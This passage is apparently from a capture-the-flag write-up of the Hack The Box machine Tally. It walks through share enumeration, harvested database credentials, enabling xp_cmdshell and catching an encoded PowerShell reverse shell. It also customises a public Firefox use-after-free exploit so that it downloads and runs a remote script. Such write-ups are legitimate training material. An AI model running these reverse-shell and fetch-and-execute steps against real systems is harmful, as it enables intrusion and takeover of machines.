+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-logsuccess">[+]</span><span class="go"> Enumerated shares
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">Share           Permissions     Remark</span><span class="err">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">-----           -----------     ------
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">ACCT            READ            
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">ADMIN$                          Remote Admin
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">C$                              Default share
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.10.59     445    TALLY            </span><span class="netexec-shareenum">IPC$                            Remote IPC
+</span></code></pre></div></div>
+<h4 id="download-all---fail">Download All - Fail</h4>
+<p>I’ll connect to it and see that it has a fair number of folders:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>smbclient //10.10.10.59/ACCT <span class="nt">-U</span> Finance Acc0unting
+<span class="go">Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Sep 18 05:58:18 2017
+  ..                                  D        0  Mon Sep 18 05:58:18 2017
+  Customers                           D        0  Sun Sep 17 20:28:40 2017
+  Fees                                D        0  Mon Aug 28 21:20:52 2017
+  Invoices                            D        0  Mon Aug 28 21:18:19 2017
+  Jess                                D        0  Sun Sep 17 20:41:29 2017
+  Payroll                             D        0  Mon Aug 28 21:13:32 2017
+  Reports                             D        0  Fri Sep  1 20:50:11 2017
+  Tax                                 D        0  Sun Sep 17 20:45:47 2017
+  Transactions                        D        0  Wed Sep 13 19:57:44 2017
+  zz_Archived                         D        0  Fri Sep 15 20:29:35 2017
+  zz_Migration                        D        0  Sun Sep 17 20:49:13 2017
+
+                8387839 blocks of size 4096. 656891 blocks available
+</span></code></pre></div></div>
+<p>I’ll start with a similar approach as with FTP and get everything. <code class="language-plaintext highlighter-rouge">lcd</code> changes directory on my local system. Then I’ll turn off prompt and enable recursion. Finally <code class="language-plaintext highlighter-rouge">mget *</code> will get everything:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \&gt;</span><span class="w"> </span>lcd smbloot/
+<span class="gp">smb: \&gt;</span><span class="w"> </span>prompt off
+<span class="gp">smb: \&gt;</span><span class="w"> </span>recurse on
+<span class="gp">smb: \&gt;</span><span class="w"> </span>mget <span class="k">*</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>However, after a few minutes, I’ll realize this is not a good approach. There’s a <em>ton</em> of junk on this share. I’m going to need to take a bit more targeted approach.</p>
+<h4 id="mount-share">Mount Share</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">mount</code> to mount the share onto a folder on my local system:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>Finance,pass<span class="o">=</span>Acc0unting //10.10.10.59/ACCT /mnt
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span> /mnt
+<span class="go">Customers  Fees  Invoices  Jess  Payroll  Reports  Tax  Transactions  zz_Archived  zz_Migration
+</span></code></pre></div></div>
+<h4 id="enumerate">Enumerate</h4>
+<p>Now I’ll more easily look through the file share. There’s still a ton here, a lot of which are just junk files. There’s no good way to show all the things that turned out to be nothing. I will note the <code class="language-plaintext highlighter-rouge">zz_Archived/SQL</code> folder, which has a file named <code class="language-plaintext highlighter-rouge">conn-info</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>old server details
+
+db: sa
+pass: YE%TJC%&amp;HYbe5Nw
+
+have changed for tally
+</code></pre></div></div>
+<p>I’ll try these creds for MSSQL, but as it says in the note, someone must have changed them for Tally.</p>
+<p>Eventually I’ll find <code class="language-plaintext highlighter-rouge">zz_Migrations/Binaries</code>. There’s a bunch of useless <code class="language-plaintext highlighter-rouge">.cap</code> files, which I’ll remove from this listing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f | <span class="nb">grep</span> <span class="nt">-v</span> cap<span class="err">$</span>
+<span class="go">./CardReader/RapportSetup.exe
+./FileZilla_Server-0_9_60_2.exe
+./ImportGSTIN.zip
+./NDP452-KB2901907-x86-x64-AllOS-ENU.exe
+./New folder/crystal_reports_viewer_2016_sp04_51051980.zip
+./New folder/Macabacus2016.exe
+./New folder/Orchard.Web.1.7.3.zip
+./New folder/putty.exe
+./New folder/RpprtSetup.exe
+./New folder/tableau-desktop-32bit-10-3-2.exe
+./New folder/tester.exe
+./New folder/vcredist_x64.exe
+./Sage50_2017.2.0.exe
+./Tally.ERP 9 Release 6/capsules/tally.cif
+./Tally.ERP 9 Release 6/capsules/tally.dif
+./Tally.ERP 9 Release 6/regodbc32.exe
+./Tally.ERP 9 Release 6/Setup.exe
+./Tally.ERP 9 Release 6/tally.exe
+./Tally.ERP 9 Release 6/tally.ini
+./Tally.ERP 9 Release 6/Tally.sav
+./Tally.ERP 9 Release 6/tallygatewayserver.exe
+./Tally.ERP 9 Release 6/tallywin.dat
+./Tally.ERP 9 Release 6/tallywin32.dat
+./Tally.ERP 9 Release 6/tdlfunc.log
+./windirstat1_1_2_setup.exe
+</span></code></pre></div></div>
+<p>The thing that jumps out quickly here is <code class="language-plaintext highlighter-rouge">tester.exe</code>, because it’s the only thing in here that doesn’t look like a known piece of commercial software.</p>
+<p>Looking at the strings in <code class="language-plaintext highlighter-rouge">tester.exe</code> (<code class="language-plaintext highlighter-rouge">strings -n 10 tester.exe | less</code>), there’s one towards the top that is very interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>strings <span class="nt">-n</span> 10 tester.exe
+<span class="go">!This program cannot be run in DOS mode.
+PP9E u:PPVWP                  
+9C`u99C\t4                                     
+SQLSTATE:                  
+DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
+select * from Orchard_Users_UserPartRecord
+Unknown exception
+bad locale name
+iostream stream error
+...[snip]...
+</span></code></pre></div></div>
+<p>There’s a connection string for SQL server:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">DRIVER</span><span class="o">={</span>SQL Server<span class="o">}</span><span class="p">;</span><span class="nv">SERVER</span><span class="o">=</span>TALLY, 1433<span class="p">;</span><span class="nv">DATABASE</span><span class="o">=</span>orcharddb<span class="p">;</span><span class="nv">UID</span><span class="o">=</span>sa<span class="p">;</span><span class="nv">PWD</span><span class="o">=</span>GWE3V65#6KFH93@4GWTG2G<span class="p">;</span>
+</code></pre></div></div>
+<h2 id="paths-overview">Paths Overview</h2>
+<p>There’s at least two ways to get a shell as sarah, and at least three ways to get from sarah to full access (Administrator or SYSTEM). I’m sure there are many more local privesc exploits that have been released since this box was retired in 2018, but I’m going to focus on what was known when this box was active.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/Tally-16496736811962.webp" type="image/webp"/>
+<img alt="" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/Tally-16496736811962.png"/>
+</picture>
+<p>I’ll show two ways to get a foothold as sarah. If I use MSSQL, the sarah will also have <code class="language-plaintext highlighter-rouge">SeImpersonate</code>, which allows a way to SYSTEM. From either foothold, there’s CVE-2017-0213 and a scheduled task that can be abused. The numbers at the top right of each box will match the paths in the headers in this blog.</p>
+<h2 id="shell-as-sarah-mssql---path-1">Shell as sarah [MSSQL - path 1]</h2>
+<h3 id="connect-to-mssql">Connect to MSSQL</h3>
+<p>To connect to MSSQL, I’ll use <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> (part of the <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> package), but it errors out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
+<span class="go">Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[-] [('SSL routines', 'state_machine', 'internal error')]
+</span></code></pre></div></div>
+<p>Some Googling for the error landed me on this <a href="https://github.com/SecureAuthCorp/impacket/issues/856">GitHub issue</a>. <a href="https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208">This post</a> says they fixed it by changing two lines in <code class="language-plaintext highlighter-rouge">tds.py</code>.</p>
+<p>In general, it’s not great to mess with installed Python packages, but this is such a small change, I’m going to give it a go. To find where <code class="language-plaintext highlighter-rouge">tds.py</code> is located, I’ll run again with <code class="language-plaintext highlighter-rouge">-debug</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59 <span class="nt">-debug</span>
+<span class="go">Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation
+
+[+] Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket
+[*] Encryption required, switching to TLS
+[+] Exception:
+Traceback (most recent call last):
+  File "/usr/local/bin/mssqlclient.py", line 175, in &lt;module&gt;
+    res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
+  File "/usr/local/lib/python3.8/dist-packages/impacket/tds.py", line 920, in login
+    tls.do_handshake()
+  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/SSL.py", line 1894, in do_handshake
+    self._raise_ssl_error(self._ssl, result)
+  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/SSL.py", line 1632, in _raise_ssl_error
+    _raise_current_error()
+  File "/usr/local/lib/python3.8/dist-packages/OpenSSL/_util.py", line 57, in exception_from_error_queue
+    raise exception_type(errors)
+OpenSSL.SSL.Error: [('SSL routines', 'state_machine', 'internal error')]
+[-] [('SSL routines', 'state_machine', 'internal error')]
+</span></code></pre></div></div>
+<p>The first line after the version shows the install location, <code class="language-plaintext highlighter-rouge">/usr/local/lib/python3.8/dist-packages/impacket</code>. Inside that dir, I’ll find <code class="language-plaintext highlighter-rouge">tds.py</code>. I’ll make those two changes, adding “_2” in two places, and then run again, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59 
+<span class="go">Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(TALLY): Line 1: Changed database context to 'master'.
+[*] INFO(TALLY): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
+[!] Press help for extra shell commands
+SQL&gt;
+</span></code></pre></div></div>
+<h3 id="xp_cmdshell">xp_cmdshell</h3>
+<p>Before I look through the DB, I’ll try to run commands. <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> has commands built in to interact with the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">stored procedure</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span><span class="nb">help</span>
+<span class="go">
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+</span></code></pre></div></div>
+<p>I’ll give it a try, but it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell <span class="nb">whoami</span>
+<span class="go">[-] ERROR(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+</span></code></pre></div></div>
+<p>It says access is blocked. Since I’m running as the <code class="language-plaintext highlighter-rouge">sa</code> account, I should be able to just enabled it. It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>enable_xp_cmdshell
+<span class="go">[*] INFO(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(TALLY): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell <span class="nb">whoami</span>
+<span class="go">output                                                                             
+--------------------------------------------------------------------------------   
+tally\sarah
+NULL    
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">dir</code> shows I’m running out of <code class="language-plaintext highlighter-rouge">system32</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell <span class="nb">dir</span>                                                
+<span class="go">output
+--------------------------------------------------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 8EB3-6DCB
+NULL
+ Directory of C:\Windows\system32
+NULL
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>I’ll visit <a href="https://www.revshells.com/">revshells.com</a> and update it with my IP and port. I’ll filter by windows and select PowerShell #3 (Base64). I like the base64 one because I don’t have to worry about bad characters in the MSSQL command line.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220409154527665.webp" type="image/webp"/>
+<img alt="image-20220409154527665" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220409154527665.png"/>
+</picture>
+<p>I’ll use the <code class="language-plaintext highlighter-rouge">rlwrap</code> listener to get up and down arrows on my soon to be shell, and start that on my VM. Then I’ll copy the shell, and paste it into the MSSQL prompt:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">SQL&gt;</span><span class="w"> </span>xp_cmdshell powershell <span class="nt">-e</span> JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+</code></pre></div></div>
+<p>It hangs, and there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.10.59 52464
+whoami
+tally\sarah
+</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>Once I run my first command, it returns the result and then prints the prompt.</p>
+<p>On sarah’s desktop, I’ll find <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\users\sarah\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w">
+</span><span class="go">6ff1cd63************************
+</span></code></pre></div></div>
+<h2 id="shell-as-sarah-firefox---path-2">Shell as sarah [Firefox - path 2]</h2>
+<h3 id="identify-firefox-exploit">Identify Firefox Exploit</h3>
+<h4 id="firefox-enumeration-data">Firefox Enumeration Data</h4>
+<p>There’s a couple clues from above that suggest a Firefox exploit might work. On the <a href="#site">Finance Team Migration update</a> page in SharePoint, Sarah and Tim say to Rahul:</p>
+<blockquote>
+<p>Rahul - please upload the design mock ups to the Intranet folder as  ‘index.html’ using the ftp_user account - I aim to review regularly.</p>
+</blockquote>
+<p>This implies that I can get a HTML page in front of Sarah or Tim.</p>
+<p>During the <a href="#enumeration">FTP enumeration</a>, I also found <code class="language-plaintext highlighter-rouge">Firefox Setup 44.0.2.exe</code>, which is a good hint as to what version of Firefox is running.</p>
+<h4 id="test-connection">Test Connection</h4>
+<p>To see if I can actually get a user on Tally to open <code class="language-plaintext highlighter-rouge">index.html</code>, I’ll create a quick on that just redirects to my server. If this works, then later I can start working on my exploit without having to FTP it to Tally each time. This simple page uses JavaScript to redirect:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;script&gt;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.6/sploit.html</span><span class="dl">"</span><span class="nt">&lt;/script&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>I’ll upload that, and start <code class="language-plaintext highlighter-rouge">nc</code> listening on 80 to see the full incoming request. After less than a minute, there’s a connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvkp</span> 80
+<span class="go">Listening on 0.0.0.0 80
+Connection received on 10.10.10.59 58765
+GET /sploit.html HTTP/1.1
+Host: 10.10.14.6
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html
+Connection: keep-alive
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">User-Agent</code> header ends with “Firefox/44.0”. <a href="http://useragentstring.com/index.php">useragentstring.com</a> will give even more detail:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220410132901574.webp" type="image/webp"/>
+<img alt="image-20220410132901574" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220410132901574.png"/>
+</picture>
+<h4 id="search-sploit">Search Sploit</h4>
+<p>Using <code class="language-plaintext highlighter-rouge">searchploit</code> to look for Firefox exploits returns a ton, but one jumps off a close to this version:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>searchsploit <span class="s2">"firefox 4"</span>                         
+<span class="go">-------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                      |  Path                 
+-------------------------------------------------------------------- ---------------------------------
+...[snip]...
+Mozilla Firefox &lt; 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET  | windows/remote/42484.html
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ll grab a copy:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> windows/remote/42484.html
+<span class="go">  Exploit: Mozilla Firefox &lt; 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)
+      URL: https://www.exploit-db.com/exploits/42484
+     Path: /opt/exploitdb/exploits/windows/remote/42484.html
+File Type: HTML document, ASCII text
+
+Copied to: /home/oxdf/hackthebox/tally-10.10.10.59/42484.html
+</span></code></pre></div></div>
+<p>It’s an HTML page, with the title CVE-2016-1960.</p>
+<h3 id="customize-exploit">Customize Exploit</h3>
+<h4 id="identify-shellcode">Identify Shellcode</h4>
+<p>Opening the script, towards the top, there’s a variable named <code class="language-plaintext highlighter-rouge">shellcode</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220410133758269.webp" type="image/webp"/>
+<img alt="image-20220410133758269" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220410133758269.png"/>
+</picture>
+<p>After a <code class="language-plaintext highlighter-rouge">push 0</code> and before <code class="language-plaintext highlighter-rouge">push 1</code>, there’s a place where the string <code class="language-plaintext highlighter-rouge">calc.exe</code> is pushed onto the stack. Because of how the stack works, it’s pushing four bytes at a time, reading from the end of the string.</p>
+<h4 id="new-payload">New Payload</h4>
+<p>Instead of <code class="language-plaintext highlighter-rouge">calc.exe</code>, I’ll run <code class="language-plaintext highlighter-rouge">powershell -c iex(iwr('http://10.10.14.6/0xdf.ps1'))</code>. I can use Python to quickly format that into what I need for the HTML page.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">powershell -c iex(iwr(</span><span class="sh">'</span><span class="s">http://10.10.14.6/0xdf.ps1</span><span class="sh">'</span><span class="s">))</span><span class="sh">"</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">):</span>
+<span class="gp">...</span><span class="w">     </span><span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
+<span class="c">... 
+</span><span class="go">1'))
+f.ps
+/0xd
+14.6
+.10.
+//10
+ttp:
+r('h
+x(iw
+c ie
+ll -
+rshe
+powe
+</span></code></pre></div></div>
+<p>If my payload is not of length divisible by four, it won’t print the beginning here. The simplest thing to do would be to adjust the payload to be divisible by four, but you could also mess with the Python.</p>
+<p>Now I want each of these to be hex, starting with a <code class="language-plaintext highlighter-rouge">\x68</code>, the op code for <code class="language-plaintext highlighter-rouge">push</code>, and add quotes, commas, etc.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">):</span>
+<span class="gp">...</span><span class="w">     </span><span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">    </span><span class="sh">"</span><span class="se">\\</span><span class="s">x68</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="sh">'</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]])</span> <span class="o">+</span> <span class="sh">'"</span><span class="s">,</span><span class="sh">'</span><span class="p">)</span>
+<span class="c">... 
+</span><span class="go">    "\x6831272929",
+    "\x68662e7073",
+    "\x682f307864",
+    "\x6831342e36",
+    "\x682e31302e",
+    "\x682f2f3130",
+    "\x687474703a",
+    "\x6872282768",
+    "\x6878286977",
+    "\x6863206965",
+    "\x686c6c202d",
+    "\x6872736865",
+    "\x68706f7765",
+</span></code></pre></div></div>
+<p>I’ll replace the two <code class="language-plaintext highlighter-rouge">calc.exe</code> lines in the HTML file with these.</p>
+<h3 id="exploit">Exploit</h3>
+<p>I can’t use an encoded PowerShell (<code class="language-plaintext highlighter-rouge">iex</code> won’t run <code class="language-plaintext highlighter-rouge">powershell -e</code>), but since #3 has been working, I’ll grab that version from <a href="https://www.revshells.com/">revshells.com</a>, and and remove PowerShell calling it and the PowerShell arguments, leaving just have the payload in <code class="language-plaintext highlighter-rouge">0xdf.ps1</code>.</p>
+<p>Now I wait for sarah to open firefox and view <code class="language-plaintext highlighter-rouge">index.html</code>, which redirects to <code class="language-plaintext highlighter-rouge">sploit.html</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.59 - - [10/Apr/2022 18:49:33] "GET /sploit.html HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>After some failed attempts to get <code class="language-plaintext highlighter-rouge">favicon.ico</code>, there’s a string of redirections to various <code class="language-plaintext highlighter-rouge">continue=#</code> parameters on <code class="language-plaintext highlighter-rouge">sploit.html</code>, about one per second for about a minute:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.59 - - [10/Apr/2022 18:49:35] "GET /sploit.html?continue=77571776 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:49:35] "GET /sploit.html?continue=143632064 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:49:37] "GET /sploit.html?continue=209692352 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:49:38] "GET /sploit.html?continue=275752640 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:49:39] "GET /sploit.html?continue=341812928 HTTP/1.1" 200 -
+...[snip]...
+10.10.10.59 - - [10/Apr/2022 18:50:31] "GET /sploit.html?continue=77575904 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:50:33] "GET /sploit.html?continue=143636192 HTTP/1.1" 200 -
+10.10.10.59 - - [10/Apr/2022 18:50:34] "GET /sploit.html?style=192919264 HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>At the end, there’s a GET on <code class="language-plaintext highlighter-rouge">sploit.html?style=#</code>, and then it hangs for about 15 seconds. Then it gets <code class="language-plaintext highlighter-rouge">0xdf.ps1</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.59 - - [10/Apr/2022 18:50:49] "GET /0xdf.ps1 HTTP/1.1" 200 - 
